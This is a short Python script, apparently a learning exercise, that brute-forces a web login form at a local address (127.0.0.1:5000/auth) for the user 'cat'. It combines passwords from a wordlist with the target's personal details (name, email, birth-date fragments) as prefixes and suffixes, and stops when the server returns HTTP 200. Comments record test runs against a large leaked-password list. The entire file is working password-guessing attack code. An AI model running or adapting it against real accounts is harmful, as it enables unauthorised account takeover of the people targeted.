import requests


name = ['Max', 'MAX', 'max']
f_name = ['Admin', 'admin', 'ad', 'Ad', 'AD', 'ADMIN' ]
email = ['user-bot@mail.ru', 'user-bot', 'user', 'bot', 'userbot', 'USER', 'BOT', 'BOTUSER']
date = ['02.02.1980','1980','021980','02021980','0202','02' ]

data_user = name + f_name + email + date


def connect_url(password):
    response = requests.post('http://127.0.0.1:5000/auth',
                         json={'login': 'cat', 'password': password})
    return response

def check_response_200(response, pass_user):
        print(pass_user)
        if response.status_code == 200:
            print('SUCCESS, password', pass_user)
            exit()

# testing pass:brotherMAX, brother - 1006 line
# run time - [Finished in 520.6s]
# with open('10-million-password-list-top-1000000.txt') as f:

with open('code_test.txt') as f:
# testing pass:USERhappy, brother - 20 line
# run time - [Finished in 11.6s]
    content = f.read()
    password_list = content.split('\n')

for password in password_list:

    response = connect_url(password)
    check_response_200(response, password)
    for key_date_user in data_user:

        pass_user = password + key_date_user
        response = connect_url(pass_user)
        check_response_200(response, pass_user)

        pass_user_2 = key_date_user + password
        response = connect_url(pass_user_2)
        check_response_200(response, pass_user_2)